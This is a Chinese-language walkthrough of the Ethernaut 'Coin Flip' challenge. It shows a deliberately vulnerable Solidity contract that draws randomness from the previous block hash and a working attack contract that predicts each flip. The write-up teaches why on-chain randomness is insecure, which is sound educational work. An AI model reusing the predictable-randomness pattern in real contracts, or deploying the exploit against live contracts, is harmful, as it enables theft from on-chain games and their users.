# Coin Flip


## 要求
```
这是一个掷硬币的游戏，你需要连续的猜对结果。完成这一关，你需要通过你的超能力来连续猜对十次。

  这可能能帮助到你

查看上面的帮助页面，"Beyond the console" 部分
```

## 代码
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}
```

## 问题分析

漏洞点:`uint256 blockValue = uint256(blockhash(block.number - 1));`
应该是属于随机性问题。

因为在区块链中，同一个区块，可以包含多个交易，每个交易可以调用多个合约。

EVM 执行交易的过程：
- 交易被广播到以太坊网络中。
- 矿工将交易打包成区块。
- 矿工执行区块中的所有交易，并按照交易顺序依次执行每个交易中的代码。
- 个交易的执行都在同一个执行环境中进行，该环境包含了当前区块的信息，包括区块号 (block.number)。

因此，只要没有跨链，合约A调用合约B，他们会把打包到同一个区块中。因此，这两个合约，block.numer一样的一样的。


哦同时，以太坊还有很多的全局变量，block中也有一些，可以查看 [特殊变量和函数](https://solidity-cn.readthedocs.io/zh/develop/units-and-global-variables.html).

## 解决方案
思路：写一个新的合约，调用这个旧合约就ok。
但是有一点就是:`lastHash = blockValue;`.
因此最布置一个合约，依次调用10次。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlipAttack{
    uint public call_count;
    address public _target;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    event Log(bool);
    constructor(address target_){
        call_count = 0;
        _target = target_;

    }

    function pwn()public{
        bool guess = flip();
        (bool success,)=address(_target).call(abi.encodeWithSignature("flip(bool)", guess));
        if(success){
            call_count++;
            emit Log(true);
        }else{
            call_count =0;
            emit Log(false);
        }
    }

    function flip() private view returns(bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        return coinFlip == 1 ? true : false;
    }

    
}
```


## 总结
不要使用链上数据来生成随机数。
